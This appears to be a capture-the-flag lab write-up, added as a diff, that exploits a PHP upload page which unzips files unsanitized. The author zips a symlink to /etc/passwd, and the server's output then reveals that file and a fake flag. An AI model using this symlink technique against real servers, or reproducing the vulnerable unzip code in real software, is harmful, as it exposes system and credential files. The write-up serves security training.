@@ -1,0 +1,116 @@
+ 
+ 
+ 
+ [-Exploitation-]
+ 
+	
+		      
+		      ---------------level 1----------------
+		      |                                    |
+		      |          localhost:9091            |
+		      |                                    |
+		      --------------------------------------
+		      
+		      
+		      This lab have only 1 level so i make it real quick, as its named "symLink" attack, lets take a look at the backend.
+		      
+		      
+	[index.php]
+	
+				-------------------------------------------------------------------------------
+				if (!isset($_SESSION['dir'])) {
+				$_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16));
+				    }
+				    $dir = $_SESSION['dir'];
+				    if ( !file_exists($dir) )
+					mkdir($dir);
+
+				    $cmd = '';
+				    $error = '';
+				    $success = '';
+				    $debug = '...';
+				    if(isset($_FILES["file"])) {
+				try {
+				    // Fixed: Dont save file to user's directory, only use tmp_name
+				    // unzip the file
+				    $name = '/tmp/name';
+				    move_uploaded_file($_FILES["file"]["tmp_name"], $name);
+				    var_dump($_FILES["file"]["tmp_name"]);
+
+				    $cmd = "unzip " . $name . " -d " . $dir;
+				    $debug = shell_exec($cmd);
+
+				    // Remove /usr/ from directory
+				    $user_dir = str_replace("/var/www/html", "", $dir);
+				    $success = 'Successfully uploaded and unzip files into <a href="' . $user_dir . '/">' . $user_dir .'</a>';
+				    -------------------------------------------------------------------------------
+				    
+			Seems like there are no sanitization for the input zip file.
+			
+			[!] So the mindset is, we create a symlink to the location of the sensitive data and zip it, then the server unzip it and this symlink link to "sensitive" file
+			in server
+			
+	[Terminal]
+	
+				hsw@hsw:~/Desktop$ ln -s /etc/passwd way
+				hsw@hsw:~/Desktop$ file way 
+				way: symbolic link to /etc/passwd
+				hsw@hsw:~/Desktop$ zip --symlinks symlink way 
+				  adding: way (stored 0%)
+				hsw@hsw:~/Desktop$ file symlink.zip 
+				symlink.zip: Zip archive data, at least v1.0 to extract, compression method=store
+				
+			Then we upload symlink.zip
+			
+			
+	[http://localhost:9091]
+				Unzipper command: unzip /tmp/name -d /var/www/html/upload/31d0e11bb579c88191122ae95f6cace3
+
+				Successfully uploaded and unzip files into /upload/31d0e11bb579c88191122ae95f6cace3
+
+
+				Unzipper debug info:
+
+						Archive:  /tmp/name
+				    linking: /var/www/html/upload/31d0e11bb579c88191122ae95f6cace3/way  -> /etc/passwd 
+				finishing deferred symbolic links:
+				  /var/www/html/upload/31d0e11bb579c88191122ae95f6cace3/way -> /etc/passwd
+					    
+	
+	[http://localhost:9091/upload/31d0e11bb579c88191122ae95f6cace3/way]
+	
+				root:x:0:0:root:/root:/bin/bash
+				daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+				bin:x:2:2:bin:/bin:/usr/sbin/nologin
+				sys:x:3:3:sys:/dev:/usr/sbin/nologin
+				sync:x:4:65534:sync:/bin:/bin/sync
+				games:x:5:60:games:/usr/games:/usr/sbin/nologin
+				man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+				lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+				mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+				news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+				uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+				proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+				www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+				backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+				list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+				irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+				gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+				nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+				_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+				CBJS{FAKE_FLAG_FAKE_FLAG}
+
+		=> Exploited
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
